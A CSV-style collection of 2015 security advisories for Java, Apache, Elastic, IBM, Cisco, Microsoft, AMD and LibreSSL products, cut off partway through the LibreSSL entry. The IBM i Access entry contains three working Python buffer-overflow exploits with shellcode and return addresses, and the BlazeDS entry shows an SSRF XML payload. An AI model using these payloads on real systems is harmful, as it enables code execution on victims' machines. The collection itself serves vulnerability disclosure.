3858,[SE-2014-02] Errata document for Issue 42 (CVE-2015-4871 affecting Java SE 7),,CVE-2015-4871,"Hello All,
On Jun 30, 2015 Security Explorations reported a security vulnerability
(Issue 42 assigned CVE-2015-4871) to Oracle affecting Java SE 7 [1].
In our original report [2], we indicated that the vulnerability had its
origin in klassItable::initialize_itable_for_interface method's
implementation of Java SE 7 HotSpot VM. We have recently learned that
our initial analysis regarding the root cause of Issue 42 was incorrect.
As a result, we have published an errata document that is available for
download from the following address:
http://www.security-explorations.com/materials/SE-2014-02-ORACLE-ERRATA.pdf
It contains more detailed information about the actual cause of Issue
42, the reasoning that has mislead us into concluding it was caused by
an improper initialization of non-public interface method slots and
some additional findings regarding this issue.
The case of incorrect analysis regarding the root cause of Issue 42 has
reminded us that in the world of security vulnerabilities, incorrect or
unverified assumptions can easily lead to wrong conclusions. These are
usually the software vendors that fall victim of it. As it turns out,
the very same can happen to security researchers.
Thank you.
Best Regards,
Adam Gowdiak
---------------------------------------------
Security Explorations
http://www.security-explorations.com
""We bring security research to the new level""
---------------------------------------------
References:
[1] SE-2014-02 Vendors status
http://www.security-explorations.com/en/SE-2014-02-status.html
[2] SE-2014-02-ORACLE, Issue #42
http://www.security-explorations.com/materials/SE-2014-02-ORACLE.pdf"
3874,CVE-2015-5255: SSRF vulnerability in Apache Flex BlazeDS 4.7.1,,CVE-2015-5255,"CVE-2015-5255: SSRF vulnerability in Apache Flex BlazeDS 4.7.1
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: BlazeDS 4.7.0 and 4.7.1
Description: The code in BlazeDS to deserialize AMF XML datatypes allows
so-called SSRF Attacks
(Server Side Request Forgery) in which the server could contact a remote
service on
behalf of the attacker. The attacker could hereby circumvent firewall
restrictions.
Mitigation: 4.7.x users should upgrade to 4.7.2
Example: For XML object containing the following string representation:
<!DOCTYPE foo PUBLIC ""-//VSR//PENTEST//EN""
""http://protected-server/protected-service""><foo>Some content</foo>
The server could access the url:
http://protected-server/protected-service
Even if directly accessing this resource is prevented by firewall rules.
Credit: This issue was discovered by ﻿James Kettle of PortSwigger Ltd.
References:
http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf
Christofer Dutz"
3880,CVE-2015-8131: Kibana CSRF vulnerability,,CVE-2015-8131,"Description:
Kibana versions prior to 4.1.3 and 4.2.1 are vulnerable to a CSRF attack.
We have been assigned CVE 2015-8131for this issue.
CVSS Score: 4.0
Remediation:
We recommend that all Kibana users upgrade to either 4.1.3, 4.2.1, or a later version.
Confirmation:
We have published a vulnerability summary at https://www.elastic.co/community/security.
We have also made a blog post about the issue and releases at https://www.elastic.co/blog/kibana-4-2-1-and-4-1-3."
3881,IBM i Access Buffer Overflow Code DOS CVE-2015-7422,,CVE-2015-7422,"[+] Credits: John Page aka hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/IBMI-ACCESS-BUFFER-OVERFLOW-DOS.txt
Vendor:
==============
www.ibm.com
Product:
====================================================
IBM i Access for Windows
Release 7.1 of IBM i Access for Windows is affected
Vulnerability Type:
========================
Stack Buffer Overflow DOS
CVE Reference:
==============
CVE-2015-7422
Vulnerability Details:
=====================
IBM i Access for Windows vulnerable to a buffer overflow, caused by improper bounds checking.
A local attacker could overflow a buffer and cause the program to crash.
Remediation/Fixes
The issue can be fixed by obtaining and applying the Service Pack SI57907.
The buffer overflow vulnerability can be remediated by applying Service Pack SI57907.
The Service Pack is available at:
http://www-03.ibm.com/systems/power/software/i/access/windows_sp.html
Workarounds and Mitigations
None known
CVSS Base Score: 4
CVSS Temporal Score: See https://exchange.xforce.ibmcloud.com/vulnerabilities/107770 for the current score
CVSS Environmental Score*: Undefined
CVSS Vector: (CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)
Disclosure Timeline:
====================================
Vendor Notification: May 21, 2015
November 18, 2015 : Public Disclosure
Exploitation Technique:
=======================
Local
Severity Level:
================
Med
Description:
======================================================================
Request Method(s): [+] local
Vulnerable Product: [+] IBM i Access for Windows Release 7.1
Affected Area(s): [+] IBMI i Access
[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.
by hyp3rlinx"
3882,IBM i Access Buffer Overflow Code Exec CVE-2015-2023,,CVE-2015-2023,"[+] Credits: John Page aka hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/IBMI-CLIENT-ACCESS-BUFFER-OVERFLOW.txt
Vendor:
==============
www.ibm.com
Product:
====================================================
IBM i Access for Windows
Release 7.1 of IBM i Access for Windows is affected
Vulnerability Type:
=======================
Stack Buffer Overflow
Arbitrary Code Exec
CVE Reference:
==============
CVE-2015-2023
Vulnerability Details:
=====================
IBM i Access for Windows is vulnerable to a buffer overflow. A local attacker could overflow a
buffer and execute arbitrary code on the Windows PC.
client Access has ability to receive remote commands via ""Cwbrxd.exe"" service
Ref: http://www-01.ibm.com/support/docview.wss?uid=nas8N1019253
""Incoming remote command was designed for running non-interactive commands and programs on a PC"",
therefore a remote attacker could execute arbitrary code on the system.
Remediation/Fixes
The issue can be fixed by obtaining and applying the Service Pack SI57907.
The buffer overflow vulnerability can be remediated by applying Service Pack SI57907.
The Service Pack is available at:
http://www-03.ibm.com/systems/power/software/i/access/windows_sp.html
Workarounds and Mitigations
None known
CVSS Base Score: 4.4
CVSS Temporal Score: See http://xforce.iss.net/xforce/xfdb/104044 for the current score
CVSS Environmental Score*: Undefined
CVSS Vector: (AV:L/AC:M/Au:N/C:P/I:P/A:P)
Exploit code(s):
==============================================================================
Three python POC scriptz follow that exploitz various component of IBM i Access.
1) Exploits ""ftdwprt.exe"", direct EIP overwrite
import struct,os,subprocess
pgm=""C:\Program Files (x86)\IBM\Client Access\AFPViewr\ftdwprt.exe ""
#shellcode to pop calc.exe Windows 7 SP1
sc=(""x31xF6x56x64x8Bx76x30x8Bx76x0Cx8Bx76x1Cx8B""
""x6Ex08x8Bx36x8Bx5Dx3Cx8Bx5Cx1Dx78x01xEBx8B""
""x4Bx18x8Bx7Bx20x01xEFx8Bx7Cx8FxFCx01xEFx31""
""xC0x99x32x17x66xC1xCAx01xAEx75xF7x66x81xFA""
""x10xF5xE0xE2x75xCFx8Bx53x24x01xEAx0FxB7x14""
""x4Ax8Bx7Bx1Cx01xEFx03x2Cx97x68x2Ex65x78x65""
""x68x63x61x6Cx63x54x87x04x24x50xFFxD5xCC"")
# use jmp or call esp in FTDBT.dll under AFPviewer for Client Access
# we find ---> 0x638091df : jmp esp | {PAGE_EXECUTE_READ} [FTDBDT.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.05.04.00
(C:Program Files (x86)IBMClient AccessAFPViewrFTDBDT.dll)
rp=struct.pack('<L', 0x638091FB)
payload=""A"" * 1043+rp+sc+""x90""*20
subprocess.Popen([pgm, payload], shell=False) #<----1043 bytes outside of debugger use 1044 in debugger.
==================================
2) Exploits ""ftdwinvw.exe"", direct EIP overwrite
import struct,os,subprocess
pgm=""C:\Program Files (x86)\IBM\Client Access\AFPViewr\ftdwinvw.exe ""
#shellcode to pop calc.exe Windows 7 SP1
sc=(""x31xF6x56x64x8Bx76x30x8Bx76x0Cx8Bx76x1Cx8B""
""x6Ex08x8Bx36x8Bx5Dx3Cx8Bx5Cx1Dx78x01xEBx8B""
""x4Bx18x8Bx7Bx20x01xEFx8Bx7Cx8FxFCx01xEFx31""
""xC0x99x32x17x66xC1xCAx01xAEx75xF7x66x81xFA""
""x10xF5xE0xE2x75xCFx8Bx53x24x01xEAx0FxB7x14""
""x4Ax8Bx7Bx1Cx01xEFx03x2Cx97x68x2Ex65x78x65""
""x68x63x61x6Cx63x54x87x04x24x50xFFxD5xCC"")
#payload=""A""*1044+""RRRR""+""x90""*10+""B""*100 #Test EIP
rp=struct.pack('<L', 0x638091fb) #CALL ESP (0x638091fb) FTDBDT.dll
payload=""A""*1044+rp+""x90""*10+sc #KABOOM!!!
subprocess.Popen([pgm, payload], shell=False)
registers dump...
EAX 0000040B
ECX 0044AAB8 ASCII ""AAAAAAAAA...
EDX 7F17E09F
EBX 00000000
ESP 0018E5B8
EBP 41414141
ESI 005A9FB9 ASCII ""AAAAAAAAA...
EDI 0044E94C ftdwinvw.0044E94C
EIP 52525252 <----------BOOM!
C 0 ES 002B 32bit 0(FFFFFFFF)
P 0 CS 0023 32bit 0(FFFFFFFF)
A 0 SS 002B 32bit 0(FFFFFFFF)
Z 0 DS 002B 32bit 0(FFFFFFFF)
S 0 FS 0053 32bit 7EFDD000(FFF)
T 0 GS 002B 32bit 0(FFFFFFFF)
D 0
O 0 LastErr ERROR_SUCCESS (00000000)
EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
3 2 1 0 E S P U O Z D I
FST 0000 Cond 0 0 0 0 Err 0 0 0 0 0 0 0 0 (GT)
FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1
3) Exploits ""PCSWS.exe"", structured exeception handler (SEH) overwrite
pgm=""C:\Program Files (x86)\IBM\Client Access\Emulator\pcsws.exe ""
#ctrl EIP at 1340 bytes, ESP points to RETURN to ntdll.770BB499 so we will jump 8 bytes to our SC
#as ESP points to our SC 8 bytes after!
jmp=""xEBx06""+""x90""*2
#payload=""A""*1336+""BBBB"" #Test
#shellcode to pop calc.exe Windows 7 SP1
sc=(""x31xF6x56x64x8Bx76x30x8Bx76x0Cx8Bx76x1Cx8B""
""x6Ex08x8Bx36x8Bx5Dx3Cx8Bx5Cx1Dx78x01xEBx8B""
""x4Bx18x8Bx7Bx20x01xEFx8Bx7Cx8FxFCx01xEFx31""
""xC0x99x32x17x66xC1xCAx01xAEx75xF7x66x81xFA""
""x10xF5xE0xE2x75xCFx8Bx53x24x01xEAx0FxB7x14""
""x4Ax8Bx7Bx1Cx01xEFx03x2Cx97x68x2Ex65x78x65""
""x68x63x61x6Cx63x54x87x04x24x50xFFxD5xCC"")
rp=struct.pack('<L', 0x678c1e49) #pop pop ret 0x67952486 PCSW32X.dll
payload=""A""*1332+jmp+rp+sc+""x90""*10 #KABOOOOOOOOOOOOOOOOOOM!
subprocess.Popen([pgm, payload], shell=False)
register dump...
0018FF6C 41414141 AAAA
0018FF70 41414141 AAAA
0018FF74 41414141 AAAA
0018FF78 41414141 AAAA Pointer to next SEH record
0018FF7C 42424242 BBBB SE handler
0018FF80 004C0400 .L. pcsws.004C0400
Disclosure Timeline:
====================================
Vendor Notification: May 21, 2015
November 18, 2015 : Public Disclosure
Exploitation Technique:
=======================
Local / Remote
Severity Level:
================
High
Description:
=================================================================================
Request Method(s): [+] local or remote commands via ""Cwbrxd.exe"" service
Vulnerable Product: [+] IBM i Access for Windows Release 7.1
Affected Area(s): [+] OS
[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.
by hyp3rlinx"
3898,CVE-2015-6357: Cisco FireSIGHT Management Center SSL Validation Vulnerability,,CVE-2015-6357,"Title: Cisco FireSIGHT Management Center Certificate Validation Vulnerability
Blog URL: http://wadofstuff.blogspot.com.au/2015/11/cve-2015-6357-firepwner-exploit-for.html
Vendor: Cisco
Product: FireSIGHT Management Center
Affected Versions: 5.2.x, 5.3.x, 5.4.x
Advisory URL: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc
CVE: CVE-2015-6357
CVSS: 5.1
The Cisco FireSIGHT Management Center appliance is used to manage Cisco
FirePOWER Intrusion Prevention Systems (IPS), also known as Sourcefire IPS.
FireSIGHT is responsible for downloading updated IPS signatures and installing
them on managed IPS devices.
On its own the Cisco FireSIGHT Management Center Certificate Validation
Vulnerability is a medium severity vulnerability with a CVSS of 5.1.
However, this vulnerability is an example of why SSL certificate
validation is so
important. In this exploit I will demonstrate how the vulnerability
can be leveraged
to obtain privileged remote command execution on a Cisco FireSIGHT system. The
exploit chains the SSL validation vulnerability with the software update process
on the Cisco FireSIGHT system to trick the target system into
downloading a malicious
update and executing it to obtain a reverse shell with **root** privileges.
Read the full advisory at
http://wadofstuff.blogspot.com.au/2015/11/cve-2015-6357-firepwner-exploit-for.html
Credits:
This security vulnerability was found by Matthew Flanagan.
Disclosure Timeline:
- 2015-08-31 Vulnerability discovered in FireSIGHT 5.4.x and exploit developed
by Matthew Flanagan.
- 2015-09-01 Initial contact made with Cisco PSIRT psirt cisco com.
- 2015-09-01 PSIRT responded asking for more information.
- 2015-09-01 Matthew Flanagan provided PSIRT with full write up and
exploit of vulnerability.
- 2015-09-02 PSIRT raised FireSIGHT defect and incident PSIRT-190974966.
- 2015-09-15 Matthew Flanagan reported to Cisco PSIRT that versions
5.2.0 and 5.3.0 are also
vulnerable.
- 2015-10-16 PSIRT advised me of the CVSS score they assigned to the
vulnerability.
- 2015-11-09 PSIRT assigned CVE ID CVE-2015-6357.
- 2015-11-16 [Cisco FireSIGHT Management Center Certificate Validation
Vulnerability][3] published.
- 2015-11-16 Matthew Flanagan's findings published."
3923,Microsoft .NET Framework XSS / Elevation of Privilege CVE-2015-6099,,CVE-2015-6099,"[+] Credits: John Page aka hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/AS-MICROSOFT-XSS-ELEVATION-OF-PRIVILEGE.txt
Vendor:
==================
www.microsoft.com
Product:
===========================
Microsoft .NET Framework
Vulnerability Type:
============================
XSS / Elevation of Privilege
CVE Reference:
==============
CVE-2015-6099
Vulnerability Details:
======================
Microsoft .NET Framework is prone to a cross-site scripting vulnerability because it fails
to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary
script code in the browser of an unsuspecting user in the context of the affected site. This may
allow the attacker to steal cookie-based authentication credentials and launch other attacks.
.NET Elevation of Privilege Vulnerability - CVE-2015-6099
An elevation of privilege vulnerability exists when ASP.NET improperly validates values in HTTP requests,
exposing users to a potential cross-site scripting (XSS) attack. An attacker who successfully exploited the
vulnerability could leverage a vulnerable website to inject client-side script into a user�s browser and
ultimately modify or spoof content, conduct phishing activities, disclose information, or perform any action on
the vulnerable website that the target user has permission to perform. To exploit this vulnerability, user interaction
is required. In a web-browsing scenario a user would have to navigate to a compromised website.
In an email attack scenario an attacker would have to convince a user who is logged on to a vulnerable server to
click a specially crafted link in an email. The update addresses the vulnerability by modifying how ASP.NET validates
the value of an HTTP request.
Microsoft received information about the vulnerability through coordinated vulnerability disclosure. At the time this security
bulletin was originally issued, Microsoft was unaware of any attack attempting to exploit this vulnerability.
Microsoft has not identified any mitigating factors for this vulnerability.
Microsoft has not identified any workarounds for this vulnerability.
The following workarounds may be helpful in your situation:
Remove requestPathInvalidCharacters key from web.config
In order to work around this issue, administrators can remove the <httpRuntime requestPathInvalidCharacters="""" />
non-default setting from web.config, or at least include �:� in the requestPathInvalidCharacters setting.
How to undo the workaround:
Restore the previously removed <httpRuntime requestPathInvalidCharacters="""" /> line.
https://technet.microsoft.com/library/security/MS15-118
http://www.symantec.com/security_response/vulnerability.jsp?bid=77479&om_rssid=sr-advisories
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6099
Disclosure Timeline:
========================================
Vendor Notification: August 15, 2015
November 10, 2015 : Public Disclosure
Exploitation Technique:
=======================
Remote
Severity Level:
===============
High
Description:
================================================
Request Method(s): [+] GET / POST
Vulnerable Product versions:
Microsoft .NET Framework 4.0
Microsoft .NET Framework 4.5
Microsoft .NET Framework 4.5.1
Microsoft .NET Framework 4.5.2
Microsoft .NET Framework 4.6
Microsoft Windows 10 for 32-bit Systems
Microsoft Windows 10 for x64-based Systems
Microsoft Windows 10 version 1511 for 32-bit Systems
Microsoft Windows 10 version 1511 for x64-based Systems
Microsoft Windows 7 for 32-bit Systems SP1
Microsoft Windows 7 for x64-based Systems SP1
Microsoft Windows 8 for x64-based Systems
Microsoft Windows 8.1 for 32-bit Systems
Microsoft Windows 8.1 for x64-based Systems
Microsoft Windows RT
Microsoft Windows RT 8.1
Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1
Microsoft Windows Server 2008 R2 for x64-based Systems SP1
Microsoft Windows Server 2008 for 32-bit Systems SP2
Microsoft Windows Server 2008 for Itanium-based Systems SP2
Microsoft Windows Server 2008 for x64-based Systems SP2
Microsoft Windows Server 2012
Microsoft Windows Server 2012 R2
Microsoft Windows Vista SP2
Microsoft Windows Vista x64 Edition SP2
===========================================================
[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.
by hyp3rlinx"
3929,[ANNOUNCE] CVE-2014-3576 - Apache ActiveMQ vulnerabilities,,CVE-2014-3576,"There following security vulnerability was reported against Apache
ActiveMQ 5.10.0 and older versions.
Please check the following document and see if you’re affected by the issue.
http://activemq.apache.org/security-advisories.data/CVE-2014-3576-announcement.txt
Apache ActiveMQ 5.11.0 and newer with appropriate fixes was released and
available for upgrade.
--
Tim Bish
RedHat Inc.
tim.bish redhat com | www.redhat.com"
3932,CVE-2015-5378,,CVE-2015-5378,"Summary:
Logstash 1.5.2 and prior versions are vulnerable to a SSL/TLS security issue called the FREAK attack. If you are using the Lumberjack input, FREAK allows an attacker to successfully implement a man in the middle attack, intercepting communication between the Logstash Forwarder agent and Logstash server.
Note: Only deployments using the Logstash Forwarder or the Lumberjack input are affected by this vulnerability.
Fixed versions:
Version 1.5.3 and 1.4.4 has been patched with a fix that addresses this vulnerability.
Remediation:
Users that currently use Logstash Forwarder in combination with Lumberjack input in Logstash or may want to use it in the future should upgrade to 1.5.3 or 1.4.4.
Users that do not want to upgrade can address the vulnerability by disabling the Lumberjack input. Please note that you will not be able to use Logstash Forwarder after the Lumberjack input is disabled.
Credit:
Accenture Security Team discovered this issue. Paul Kloves from Accenture has been coordinating with us.
CVSS
Overall CVSS score: 4.3"
3933,CVE-2015-5619,,CVE-2015-5619,"Summary:
Logstash 1.5.3 and prior versions are vulnerable to a SSL/TLS security
issue which allows an attacker to successfully implement a man in the
middle attack. This vulnerability is not present in the initial
installation of Logstash. This insecurity is exposed when users
configure Lumberjack output to connect two Logstash instances. In such
deployments, a Logstash instance is used to collect logs from a
webserver and securely transmit them to a central Logstash instance to
perform additional filtering and storing.
Note: Communication between Logstash Forwarder and Lumberjack Input in
Logstash is not affected by this vulnerability.
We have been assigned CVE-2015-5619 for this issue.
Fixed versions:
Version 1.5.4 and 1.4.5 has been patched with a fix that addresses
this vulnerability.
Remediation:
Users that currently use Logstash with the Lumberjack output or may
want to use it in the future should upgrade to 1.5.4 or 1.4.5.
Users that do not want to upgrade can address the vulnerability by
disabling the Lumberjack output.
Credit:
Markus Frosch reported this issue.
CVSS
Overall CVSS score: 4.3"
3936,Elasticsearch vulnerability CVE-2015-4165,,CVE-2015-4165,"Summary:
Elasticsearch versions 1.0.0 - 1.5.2 are vulnerable to an engineered attack on other applications on the system. The snapshot API may be used indirectly to place snapshot metadata files into locations that are writeable by the user running the Elasticsearch process. It is possible to create a file that another application could read and take action on, such as code execution.
This vulnerability requires several conditions to be exploited. There must be some other application running on the system that would read Lucene files and execute code from them. That application must also be accessible to the attacker, e.g. over the network. Lastly, the Java VM running the Elasticsearch process must be able to write into a location that the other application will read and potentially execute.
We have been assigned CVE-2015-4165 for this issue. Please note that this vulnerability was previously disclosed in June, 2015. Verification is available at
https://www.elastic.co/community/security
Fixed versions:
Version 1.6.0 address the vulnerability by adding configuration to limit the filesystem paths that the Java VM can write into.
Remediation:
Users should upgrade to the 1.6.0 release.
Users that do not want to upgrade can address the vulnerability in any of several ways:
• ensure that there are no other applications running on the Elasticsearch server
• ensure that the Elasticsearch JVM cannot write a directory that other applications read from
• use a firewall, reverse proxy, or Shield to prevent snapshot API calls from some or all users
• ensure that other applications running on the server are not accessible to attackers
CVSS
Overall CVSS score: 5.1"
3938,Elasticsearch vulnerability CVE-2015-5377,,CVE-2015-5377,"Summary:
Elasticsearch versions prior to 1.6.1 are vulnerable to an engineered attack on its transport protocol that enables remote code execution. This issue is related to the Groovy announcement in CVE-2015-3253.
Deployments are vulnerable even when Groovy dynamic scripting is disabled.
We have been assigned CVE-2015-5377 for this issue. Please note that we published this vulnerability in July, 2015 on our website and forums.
Fixed versions:
Version 1.6.1, 1.7.0, and 2.0.0 address the vulnerability.
Remediation:
Users should upgrade to the 1.6.1 or higher versioned releases.
Users that do not want to upgrade can address the vulnerability by securing the transport protocol port (default 9300) to allow access by only trusted agents.
CVSS
Overall CVSS score: 5.1
Credits:
cpnrodzc7 working with HP's Zero Day Initiative (ZDI) found a similar issue with Elasticsearch."
3967,CVE-2015-7326 (XXE vulnerability in Milton Webdav),,CVE-2015-7326,"Dear all,
I've recently found vulnerability in Milton Webdav 2.7.0.1 (project page - http://milton.io/). Milton Webdav is a Java library for adding webdav capabilities to your applications.
Milton Webdav supports PROPFIND, PROPPATCH and LOCK methods. This Webdav methods expect XML in request body. Java classes io.milton.http.webdav.DefaultPropFindRequestFiledParser, io.milton.http.webdav.DefaultPropPatchParser and io.milton.http.LockInfoSaxHandler are responsible for parsing and processing incoming XML for PROPFIND, PROPPATCH and LOCK methods. To parse XML requests these classes use SAXParser from Xerces2-J library (http://xerces.apache.org/xerces2-j/) but failed to securely setup parameters for SAXParser.
Here is the code snippet from io.milton.http.webdav.DefaultPropFindRequestFiledParser.
..
@Override
public PropertiesRequest getRequestedFields( InputStream in ) {
final Set<QName> set = new LinkedHashSet<QName>();
try {
ByteArrayOutputStream bout = new ByteArrayOutputStream();
StreamUtils.readTo( in, bout, false, true );
byte[] arr = bout.toByteArray();
if( arr.length > 1 ) {
ByteArrayInputStream bin = new ByteArrayInputStream( arr );
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setFeature(""http://xml.org/sax/features/external-parameter-entities"", false);
..
This code prohibits declaration of external parameter entities. At the same time general external entities and external DTDs are allowed.
Attacker can exploit this issue by adding DOCTYPE declaration to XML body of PROPFIND, PROPPATCH and LOCK methods that references external DTD or have general external entity declaration. Vulnerability allows attacker to read local files (list directory content), perform SSRF and DoS attacks. Exploit for CVE-2015-1833 written by me (https://www.exploit-db.com/exploits/37110/) with minor modifications could be used to exploit this issue.
Now vulnerability is patched. See commits b5851c1 and b41072b here https://github.com/miltonio/milton2. If you use Milton Webdav 2.7.0.1 or below, please, update to version 2.7.0.3."
3988,CVE-2015-7723 - Privilege Escalation Via Symlink Attacks On POSIX Shared Memory With Insecure Permissions In AMD fglrx-driver,,CVE-2015-7723,"Vulnerability title: Privilege Escalation Via Symlink Attacks On POSIX Shared Memory With Insecure Permissions In AMD fglrx-driver
CVE: CVE-2015-7723
Vendor: AMD
Product: fglrx-driver
Affected version: 14.4.2
Fixed version: 15.7
Reported by: Tim Brown
Details:
It has been identified that the userland portion of the fglrx-driver utilised by Xorg allows privilege escalation via symlink attacks on POSIX shared memory with insecure permissions.
On systems with a Linux kernel where fs.protected_symlinks is not set to 1, or where this feature is not available, the following code (present in libaticaldd.so and fglrx_dri.so) calls shm_open() with insecure flags specified which allows the Linux kernel to follow an existent symlink under /dev/shm:
mov $0x1b6,%edx ; $edx (mode) = 0666
mov $0x42,%esi ; $esi (oflag) = O_CREAT | O_RDWR - missing O_EXCL
mov %r13,%rdi
callq 208b68 <shm_open@plt>
The same call to shm_open() requests that the permissions of newly created file are 0666 and as a result, an arbitrary file, owned by root, with permissions of 0666 can be created anywhere on the filesystem
Furthermore, the code then proceeds to force the permissions on the resultant file to 0666 using fchmod(). This can be useful if the symlink target already exists:
mov $0x1b6,%esi ; $esi (mode) = 0666
mov %eax,%edi
callq 209058 <fchmod@plt>
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2015-7723/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2015, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
###############################################################
This email originates from the systems of Portcullis
Computer Security Limited, a Private limited company,
registered in England in accordance with the Companies
Act under number 02763799. The registered office
address of Portcullis Computer Security Limited is:
Portcullis House, 2 Century Court, Tolpits Lane, Watford,
United Kingdom, WD18 9RS.
The information in this email is confidential and may be
legally privileged. It is intended solely for the addressee.
Any opinions expressed are those of the individual and
do not represent the opinion of the organisation. Access
to this email by persons other than the intended recipient
is strictly prohibited.
If you are not the intended recipient, any disclosure,
copying, distribution or other action taken or omitted to be
taken in reliance on it, is prohibited and may be unlawful.
When addressed to our clients any opinions or advice
contained in this email is subject to the terms and
conditions expressed in the applicable Portcullis Computer
Security Limited terms of business.
###############################################################
#####################################################################################
This e-mail message has been scanned for Viruses and Content and cleared
by MailMarshal.
#####################################################################################"
3989,CVE-2015-7724 - Privilege Escalation Via Symlink Attacks On POSIX Shared Memory With Insecure Permissions In AMD fglrx-driver,,CVE-2015-7724,"Vulnerability title: Privilege Escalation Via Symlink Attacks On POSIX Shared Memory With Insecure Permissions In AMD fglrx-driver
CVE: CVE-2015-7724
Vendor: AMD
Product: fglrx-driver
Affected version: 15.7
Fixed version: 15.9
Reported by: Tim Brown
Details:
In the process of validating the fix for CVE-2015-7723, it has been identified that the userland portion of the fglrx-driver utilised by Xorg still allows privilege escalation via symlink attacks on POSIX shared memory with insecure permissions.
As with the original vulnerability, with a Linux kernel where fs.protected_symlinks is not set to 1, or where this feature is not available, the following code (present in shared libraries distributed as part of fglrx-driver) calls shm_open() with insecure flags specified which allows the Linux kernel to follow an existent symlink under /dev/shm:
mov $0x1b6,%edx ; $edx (mode) = 0666
mov $0x42,%esi ; $esi (oflag) = O_CREAT | O_RDWR - missing O_EXCL
mov %r13,%rdi
callq 208b68 <shm_open@plt>
The same call to shm_open() requests that the permissions of newly created file are 0666 and as a result, an arbitrary file, owned by root, with permissions of 0666 can be created anywhere on the filesystem
Furthermore, the code then proceeds to force the permissions on the resultant file to 0666 using fchmod(). This can be useful if the symlink target already exists:
mov $0x1b6,%esi ; $esi (mode) = 0666
mov %eax,%edi
callq 209058 <fchmod@plt>
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2015-7724/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2015, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
###############################################################
This email originates from the systems of Portcullis
Computer Security Limited, a Private limited company,
registered in England in accordance with the Companies
Act under number 02763799. The registered office
address of Portcullis Computer Security Limited is:
Portcullis House, 2 Century Court, Tolpits Lane, Watford,
United Kingdom, WD18 9RS.
The information in this email is confidential and may be
legally privileged. It is intended solely for the addressee.
Any opinions expressed are those of the individual and
do not represent the opinion of the organisation. Access
to this email by persons other than the intended recipient
is strictly prohibited.
If you are not the intended recipient, any disclosure,
copying, distribution or other action taken or omitted to be
taken in reliance on it, is prohibited and may be unlawful.
When addressed to our clients any opinions or advice
contained in this email is subject to the terms and
conditions expressed in the applicable Portcullis Computer
Security Limited terms of business.
###############################################################
#####################################################################################
This e-mail message has been scanned for Viruses and Content and cleared
by MailMarshal.
#####################################################################################"
4026,Qualys Security Advisory - LibreSSL (CVE-2015-5333 and CVE-2015-5334),,CVE-2015-5333,"Qualys Security Advisory
LibreSSL (CVE-2015-5333 and CVE-2015-5334)
========================================================================
Contents
========================================================================
Summary
Memory Leak (CVE-2015-5333)
Buffer Overflow (CVE-2015-5334)
Acknowledgments
========================================================================
Summary
========================================================================
In order to achieve remote code execution against the vulnerabilities
that we recently discovered in OpenSMTPD (CVE-2015-7687), a memory leak
is needed. Because we could not find one in OpenSMTPD itself, we started
to review the malloc()s and free()s of its libraries, and eventually
found a memory leak in LibreSSL's OBJ_obj2txt() function; we then
realized that this function also contains a buffer overflow (an
off-by-one, usually stack-based).
The vulnerable function OBJ_obj2txt() is reachable through
X509_NAME_oneline() and d2i_X509(), which is called automatically to
decode the X.509 certificates exchanged during an SSL handshake (both
client-side, unless an anonymous mode is used, and server-side, if
client authentication is requested).
These vulnerabilities affect all LibreSSL versions, including LibreSSL
2.0.0 (the first public release) and LibreSSL 2.3.0 (the latest release
at the time of writing). OpenSSL is not affected.
========================================================================
Memory Leak (CVE-2015-5333)
========================================================================
OBJ_obj2txt() converts an ASN.1 object identifier (the ASN1_OBJECT a)
into a null-terminated string of numerical subidentifiers separated by
dots (at most buf_len bytes are written to buf).
Large subidentifiers are temporarily stored in a BIGNUM (bl) and
converted by BN_bn2dec() into a printable string of decimal characters
(bndec). Many such bndec strings can be malloc()ated and memory-leaked
